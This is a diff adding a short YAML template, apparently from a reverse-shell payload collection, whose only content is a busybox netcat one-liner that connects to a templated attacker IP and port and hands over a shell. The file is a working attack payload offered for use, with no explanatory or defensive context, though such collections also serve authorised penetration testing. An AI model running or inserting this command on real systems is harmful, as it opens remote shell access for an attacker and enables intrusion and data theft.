@@ -1,0 +1,8 @@
+metadata:
+  filename: "revshell-linux-busybox-nc.yaml"
+  tags: ["shell", "linux"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  busybox nc <%=$(esh variables/attacker_ip)%> <%=$(esh variables/shell_port)%> -e sh
